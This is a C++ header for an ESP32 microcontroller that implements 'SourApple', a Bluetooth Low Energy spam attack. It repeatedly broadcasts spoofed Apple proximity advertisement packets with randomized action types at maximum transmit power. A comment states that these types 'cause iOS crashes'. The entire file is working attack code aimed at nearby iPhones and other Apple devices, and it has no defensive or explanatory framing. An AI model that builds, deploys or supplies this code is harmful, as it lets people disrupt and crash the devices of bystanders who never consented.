// sourapple.h
#ifndef SOURAPPLE_H
#define SOURAPPLE_H

#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <BLEUtils.h>

extern BLEAdvertising *pAdvertising;

bool sourappleActive = false;
uint8_t applePacket[17];

void startSourApple() {
  sourappleActive = true;
  BLEDevice::init("");
  pAdvertising = BLEDevice::getAdvertising();
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  Serial.println("SourApple started");
}

void stopSourApple() {
  sourappleActive = false;
  if (pAdvertising) {
    pAdvertising->stop();
  }
  Serial.println("SourApple stopped");
}

void buildApplePacket() {
  int i = 0;
  applePacket[i++] = 16;          // Length
  applePacket[i++] = 0xFF;        // Manufacturer Specific
  applePacket[i++] = 0x4C;        // Apple
  applePacket[i++] = 0x00;        // 
  applePacket[i++] = 0x0F;        // Type
  applePacket[i++] = 0x05;        // Length
  applePacket[i++] = 0xC1;        // Action Flags
  
  // Action types that cause iOS crashes
  const uint8_t types[] = {0x27, 0x09, 0x02, 0x1E, 0x2B, 0x2D, 0x2F, 0x01, 0x06, 0x20, 0xC0};
  applePacket[i++] = types[random(sizeof(types))];
  
  // Random auth tag
  esp_fill_random(&applePacket[i], 3);
  i += 3;
  applePacket[i++] = 0x00;
  applePacket[i++] = 0x00;
  applePacket[i++] = 0x10;
  esp_fill_random(&applePacket[i], 3);
}

void runSourApple() {
  if (!sourappleActive) return;
  
  buildApplePacket();
  BLEAdvertisementData advData;
  advData.addData(std::string((char*)applePacket, 17));
  pAdvertising->setAdvertisementData(advData);
  pAdvertising->start();
  delay(20);
  pAdvertising->stop();
  delay(40);
}

#endif
